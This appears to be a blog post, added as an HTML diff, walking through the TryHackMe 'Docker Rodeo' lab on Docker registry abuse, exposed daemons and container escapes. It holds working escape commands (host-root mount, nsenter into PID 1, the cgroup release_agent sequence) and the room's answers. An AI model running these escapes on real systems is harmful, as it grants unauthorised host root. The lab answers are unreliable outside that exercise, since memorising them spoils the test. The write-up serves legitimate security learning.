@@ -1,0 +1,387 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>TryHackMe - Docker Rodeo – Jennifer Reeves – IT Security Enthusiast</title>
+    
+    
+
+
+
+
+
+
+    
+  
+        <meta charset="utf-8" />
+    <meta content='text/html; charset=utf-8' http-equiv='Content-Type'>
+    <meta http-equiv='X-UA-Compatible' content='IE=edge'>
+    <meta name='viewport' content='width=device-width, initial-scale=1.0, maximum-scale=1.0'>
+
+    
+    <meta name="description" content="Subscriber Room
+
+" />
+    <meta property="og:description" content="Subscriber Room
+
+" />
+    
+    <meta name="author" content="Jennifer Reeves" />
+
+    
+    <meta property="og:title" content="TryHackMe - Docker Rodeo" />
+    <meta property="twitter:title" content="TryHackMe - Docker Rodeo" />
+    
+
+    <!--[if lt IE 9]>
+      <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+    <![endif]-->
+
+    <link rel="stylesheet" type="text/css" href="/style.css" />
+    <link rel="alternate" type="application/rss+xml" title="Jennifer Reeves - IT Security Enthusiast" href="/feed.xml" />
+
+    <!-- Created with Jekyll Now - http://github.com/barryclark/jekyll-now -->
+  </head>
+
+  <body>
+    <div class="wrapper-masthead">
+      <div class="container">
+        <header class="masthead clearfix">
+          <a href="/" class="site-avatar"><img src="https://github.com/jbreeves/jbreeves.github.io/blob/master/images/self%20portrait.jpg?raw=true" /></a>
+
+          <div class="site-info">
+            <h1 class="site-name"><a href="/">Jennifer Reeves</a></h1>
+            <p class="site-description">IT Security Enthusiast</p>
+          </div>
+
+          <nav>
+            <a href="/">Blog</a>
+            <a href="/about">About</a>
+          </nav>
+        </header>
+      </div>
+    </div>
+
+    <div id="main" role="main" class="container">
+      <article class="post">
+  <h1>TryHackMe - Docker Rodeo</h1>
+
+  <div class="entry">
+    <p><em>Subscriber Room</em></p>
+
+<p>This is a room about common docker vulnerabities and their exploitations.</p>
+
+<ul>
+  <li>Added target IP to /etc/hosts as docker-rodeo.thm</li>
+</ul>
+
+<h2 id="task-1---deploying-the-machine">Task 1 - Deploying the machine</h2>
+<p>Started the machine.</p>
+
+<h2 id="task-2---understanding-container-basics">Task 2 - Understanding Container Basics</h2>
+<p>Containers do not run on a hypervisor.</p>
+
+<h2 id="task-3---abusing-a-docker-registry">Task 3 - Abusing a Docker Registry</h2>
+<p>This was a divider and not a real section.</p>
+
+<h2 id="task-4---what-is-a-docker-registry">Task 4 - What is a Docker Registry?</h2>
+<ul>
+  <li>Docker Registries are used to store and provide published Docker images for use</li>
+  <li>One can switch between multiple versions of their applications and share them with other people with ease</li>
+  <li>For a Docker repository to pull specific versions, the repository must store the data about every tag</li>
+  <li>Docker images are essentially just instruction manuals so they can be reversed to understand what commands took place when the image was being built – in groups called layers.</li>
+</ul>
+
+<h2 id="task-5---interacting-with-a-docker-registry">Task 5 - Interacting with a Docker Registry</h2>
+<ul>
+  <li>Enumerate the services running to understand any potential entry points</li>
+  <li>When scanning with Nmap, take note of the API version for the Docker Registry</li>
+  <li>The Docker Registry is a JSON endpoint</li>
+  <li>Using a dedicated program such as Postman or Insomnia will make it easier to query the endpoint versus using a terminal or browser</li>
+  <li>Read the Docker Registry Documentation to discover what routes are available</li>
+</ul>
+
+<p><strong>Discovering Repositories</strong></p>
+<ul>
+  <li>Sending a <code class="language-plaintext highlighter-rouge">GET</code> request to <code class="language-plaintext highlighter-rouge">http://_hostmachine_:5000/v2/_catalog</code> will list all the repositories in the registry</li>
+  <li>Information types needed</li>
+  <li>Repository Name</li>
+  <li>Published Repository Tags “(if any)”
+    <ul>
+      <li>Every repository will have at least one tag</li>
+    </ul>
+  </li>
+  <li>Sending a <code class="language-plaintext highlighter-rouge">GET</code> request to <code class="language-plaintext highlighter-rouge">http://_hostmachine_:5000/v2/_repository_/_name_/tags/list</code> will show all published tags</li>
+</ul>
+
+<p><strong>Grabbing the Data</strong></p>
+<ul>
+  <li>Using the repository name and tag name, you can enumerate the specific repository for the manifest file</li>
+  <li>Sending a <code class="language-plaintext highlighter-rouge">GET</code> request to <code class="language-plaintext highlighter-rouge">http://_hostmachine_:5000/v2/_repository_/_name_/mainfests/_tagname_</code> will get the manifest for the tag specified</li>
+</ul>
+
+<p><strong>Questions</strong></p>
+<ol>
+  <li>What is the port number of the 2nd Docker registry?
+ 7000</li>
+  <li>What is the name of the repository within this registry?
+ securesolutions/webserver</li>
+  <li>What is the name of the tag that has been published? 
+ production</li>
+  <li>What is the Username in the database configuration?
+ admin</li>
+  <li>What is the Password in the database configuration?
+ production_admin</li>
+</ol>
+
+<h2 id="task-6---reverse-engineering-docker-images">Task 6 - Reverse Engineering Docker Images</h2>
+<ol>
+  <li>What is the “IMAGE_ID” for the “challenge” Docker image that you just downloaded?
+ 2a0a63ea5d88</li>
+  <li>Using Dive, how many “Layers” are there in this image?
+ 7</li>
+  <li>What user is successfully added?
+ uogctf</li>
+</ol>
+
+<h2 id="task-7---uploading-malicious-docker-images">Task 7 - Uploading Malicious Docker Images</h2>
+<ul>
+  <li>If a repository is vulnerable, we can upload (or push) our own images to a repository, containing malicious code
+    <ul>
+      <li>This can allow us to build commands into the container such as a netcat shell</li>
+    </ul>
+  </li>
+</ul>
+
+<p>No task questions.</p>
+
+<h2 id="task-8---rce-via-exposed-docker-daemon">Task 8 - RCE via Exposed Docker Daemon</h2>
+<ul>
+  <li>Unix filesystem sockets are faster than TCP/IP sockets but only interacts with the host itself</li>
+  <li>Must be a part of the docker group to use the docker command</li>
+  <li>Portainer or Jenkins are applications that allow docker commands to be executed remotely
+    <ul>
+      <li>To do this, a TCP/IP socket must be used</li>
+    </ul>
+  </li>
+</ul>
+
+<p>Practical Section:</p>
+<ul>
+  <li>Enumerate your host thoroughly</li>
+  <li>By default, the engine runs on port 2375</li>
+  <li>Confirm vulnerability</li>
+  <li>If port 2375 is open, use <code class="language-plaintext highlighter-rouge">curl</code> to interact with the exposed Docker daemon
+    <ul>
+      <li>Interacting with the daemon will give you system information</li>
+    </ul>
+  </li>
+  <li>Execution</li>
+  <li>perform first command using the <code class="language-plaintext highlighter-rouge">-H</code> switch to specify to the Instance to list running containers</li>
+  <li>Experimentation</li>
+  <li>Possible actions:
+    <ul>
+      <li>list containers</li>
+      <li>create your own container</li>
+      <li>extract the filesystem to view data</li>
+      <li>execute commands on host</li>
+      <li>run a container</li>
+    </ul>
+  </li>
+  <li>Use rootplease tool to create a root shell on the device itself</li>
+</ul>
+
+<p>No task questions.</p>
+
+<h2 id="task-9---escape-via-exposed-docker-daemon">Task 9 - Escape via Exposed Docker Daemon</h2>
+<p>Assumption: foothold has been gained on the container</p>
+
+<ul>
+  <li>Use <code class="language-plaintext highlighter-rouge">ls -la | grep sock</code> to find exposed Docker sockets once you have access to the machine “(via shell or ssh)”</li>
+  <li>Verify if current user can run docker commands with <code class="language-plaintext highlighter-rouge">groups</code> command</li>
+  <li>Upload alpine image to container you’re exploiting</li>
+  <li>Mount the host directory to a new container with <code class="language-plaintext highlighter-rouge">docker run -v /:/mnt --rm -it alpine chroot /mnt sh</code>
+    <ul>
+      <li>This reveals all data on the host OS</li>
+    </ul>
+  </li>
+  <li>Verify who you’re logged in as and enumerate the file system for loot</li>
+</ul>
+
+<p>No task questions.</p>
+
+<h2 id="task-10---shared-namespaces">Task 10 - Shared Namespaces</h2>
+<p>Basics</p>
+<ul>
+  <li>Containers have their own networking and file storage</li>
+  <li>This is achieved with these components of the linux kernel
+    <ul>
+      <li>Namespaces</li>
+      <li>Cgroups</li>
+      <li>OverlayFS</li>
+    </ul>
+  </li>
+  <li>Namespaces segregate system resources such as processes, files, and memory</li>
+  <li>Every linux process has a Namespace and a Process Identifier “(PID)”</li>
+  <li>You can see the docker process when you run <code class="language-plaintext highlighter-rouge">ps aux</code></li>
+  <li>When you run <code class="language-plaintext highlighter-rouge">ps aux</code> in a container there are significantly fewer processes running</li>
+</ul>
+
+<p>Why it matters</p>
+<ul>
+  <li>Notable Processes</li>
+  <li>PID 0 - process started at boot</li>
+  <li>PID 1 - processes <code class="language-plaintext highlighter-rouge">init</code>, example: <code class="language-plaintext highlighter-rouge">systemd</code></li>
+  <li>You can use process 1 on the host OS to escalate privileges</li>
+  <li>Happens when PIDs overlap between containers and host OSes</li>
+  <li>Vulnerability generally relies on having root on the container</li>
+  <li>Exploit</li>
+  <li>Use the <code class="language-plaintext highlighter-rouge">nsenter</code> command
+    <ul>
+      <li><code class="language-plaintext highlighter-rouge">nsenter --target 1 --mount sh</code>
+        <ul>
+          <li><code class="language-plaintext highlighter-rouge">--target</code> with a value of 1 will execute a shell command we later provide to execute in the namespace of the special system process ID, to get ultimate root</li>
+          <li><code class="language-plaintext highlighter-rouge">--mount</code> is where we provide the namespace we are targetting</li>
+          <li><code class="language-plaintext highlighter-rouge">sh</code> is the command that will be executed in the privileged namespace “(therefore with the namespace’s privileges)”</li>
+          <li>You may need to “Ctrl + C” to cancel the exploit once or twice for this vulnerability to work</li>
+        </ul>
+      </li>
+    </ul>
+  </li>
+</ul>
+
+<h2 id="task-11---miconfigured-privileges">Task 11 - Miconfigured Privileges</h2>
+<p>Understanding Capabilities</p>
+<ul>
+  <li>Docker can run in two modes</li>
+  <li>User Mode</li>
+  <li>Privileged Mode</li>
+  <li>Containers running in User Mode interact with the host OS through the Docker engine</li>
+  <li>Containers running in Privileged Mode bypass the Docker engine and have direct communication with the host OS</li>
+  <li>If a container is running in Privileged Mode:</li>
+  <li>Can run commands as the root user “(on the OS)”</li>
+  <li>We can use a system package such as “libcap2-bin”’s <code class="language-plaintext highlighter-rouge">capsh</code> to list the capabilities our container has: <code class="language-plaintext highlighter-rouge">capsh --print</code></li>
+  <li><code class="language-plaintext highlighter-rouge">capsh --print | grep</code> can help you zero in on different capabilities</li>
+  <li>Interesting capabilities:
+    <ul>
+      <li>cap_net_admin</li>
+      <li>cap_sys_module</li>
+      <li>cap_sys_admin</li>
+      <li>cap_sys_chroot</li>
+      <li>cap_sys_time</li>
+    </ul>
+  </li>
+  <li><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so">Proof of Concept</a></li>
+</ul>
+
+<p>What’s happening during exploitation:</p>
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">mkdir /tmp/cgrp &amp;&amp; mount -t cgroup -o rdma cgroup /tmp/cgrp &amp;&amp; mkdir /tmp/cgrp/x</code></li>
+  <li>creates a group to use the Linux kernel to write and execute our exploit</li>
+  <li><code class="language-plaintext highlighter-rouge">echo 1 &gt; /tmp/cgrp/x/notify_on_release</code></li>
+  <li>telling the kernel to execute something once the “cgroup” finishes</li>
+  <li><code class="language-plaintext highlighter-rouge">host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`</code></li>
+  <li>find out where the containers files are stored on the host and store it as a variable</li>
+  <li><code class="language-plaintext highlighter-rouge">echo "$host_path/exploit" &gt; /tmp/cgrp/release_agent</code></li>
+  <li>echo the location of the containers files into our “/exploit” and then ultimately to the “release_agent” which is what will be executed by the “cgroup” once it is released</li>
+  <li><code class="language-plaintext highlighter-rouge">echo '#!/bin/sh' &gt; /exploit</code></li>
+  <li>turn the exploit into a shell on the host</li>
+  <li><code class="language-plaintext highlighter-rouge">echo "cat /home/cmnatic/flag.txt &gt; $host_path/flag.txt" &gt;&gt; /exploit</code></li>
+  <li>execute a command to echo the host flag into a file named “flag.txt” in the container, once “/exploit” is executed</li>
+  <li><code class="language-plaintext highlighter-rouge">chmod a+x /exploit</code></li>
+  <li>make the exploit executable</li>
+  <li><code class="language-plaintext highlighter-rouge">sh -c "echo \$\$ &gt; /tmp/cgrp/x/cgroup.procs"</code></li>
+  <li>create a process and store that into “/tmp/cgrp/x/cgroup.procs”</li>
+  <li>Explore the host OS</li>
+</ul>
+
+<p>Task Question:</p>
+
+<p>Contents of “flag.txt” from the host operating system</p>
+<ul>
+  <li>thm{y<strong>**</strong><strong>**</strong><strong>**</strong>**s}</li>
+</ul>
+
+<h2 id="task-12---securing-your-container">Task 12 - Securing Your Container</h2>
+<p>Principle of Least Privilege:</p>
+<ul>
+  <li>Commands in docker run as root unless told otherwise</li>
+  <li>Give your image the least amount of privileges needed to run
+Docker Seccomp 101:</li>
+  <li>“Secure Computing” is a feature of the linux kernel</li>
+  <li>Docker uses security profiles for containers</li>
+  <li>Can deny actions such as using the mount namespace or any of the Linux system calls
+Securing Your Daemon:</li>
+  <li>In later docker installs, running a registry relies on a self-signed SSL certificate behind a webserver</li>
+  <li>Certificates must be distributed and trusted on every device interacting with the container</li>
+</ul>
+
+<h2 id="task-13---determining-if-youre-in-a-container">Task 13 - Determining if you’re in a Container</h2>
+<ul>
+  <li>Containers have fewer processes running than the host OS</li>
+  <li>use <code class="language-plaintext highlighter-rouge">ps aux</code> to view running processes</li>
+  <li>Look for the .dockerenv file</li>
+  <li>Located in the <code class="language-plaintext highlighter-rouge">/</code> directory</li>
+  <li>Use <code class="language-plaintext highlighter-rouge">cd / &amp;&amp; ls -lah</code> to view hidden files and folders</li>
+  <li>Cgroups are used by containerization software such as Docker or LXC.</li>
+  <li>Look for cgroups by going to <code class="language-plaintext highlighter-rouge">/proc/1</code> and catting the cgroups file</li>
+  <li>The cgroups file contains paths including the word docker</li>
+</ul>
+
+<h2 id="task-14---additional-material">Task 14 - Additional Material</h2>
+<ul>
+  <li><a href="https://github.com/dirtycow/dirtycow.github.io">Dirty Cow Exploit</a></li>
+  <li><a href="https://unit42.paloaltonetworks.com/breaking-docker-via-runc-explaining-cve-2019-5736/">Exploiting runC (CVE-2019-5736)</a></li>
+  <li><a href="https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/#:~:text=The%20SYS_ADMIN%20capability%20allows%20a,security%20risks%20of%20doing%20so.">Trailofbits’ capabilities demonstration</a></li>
+  <li><a href="https://docs.google.com/presentation/d/1WdByuxWgayPb-RstO-XaENSqVPGP7h6t3GS6W4jk4tk/htmlpresent">Cgroups 101</a></li>
+</ul>
+
+  </div>
+  <br>
+  <br>
+  <span>[
+    
+      
+      <a href="/tag/THM"><code class="highligher-rouge"><nobr>THM</nobr></code>&nbsp;</a>
+    
+      
+      <a href="/tag/CTF"><code class="highligher-rouge"><nobr>CTF</nobr></code>&nbsp;</a>
+    
+      
+      <a href="/tag/Docker"><code class="highligher-rouge"><nobr>Docker</nobr></code>&nbsp;</a>
+    
+  ]</span>
+  <br>
+  <br>
+  <div class="date">
+    Written on February 28, 2022
+  </div>
+
+  
+</article>
+
+    </div>
+
+    <div class="wrapper-footer">
+      <div class="container">
+        <footer class="footer">
+          
+
+
+
+<a href="https://github.com/jbreeves"><i class="svg-icon github"></i></a>
+
+<a href="https://www.linkedin.com/in/jbreeves"><i class="svg-icon linkedin"></i></a>
+
+
+<a href="https://www.twitter.com/acousticgirl"><i class="svg-icon twitter"></i></a>
+
+
+
+        </footer>
+      </div>
+    </div>
+
+    
+
+  </body>
+</html>
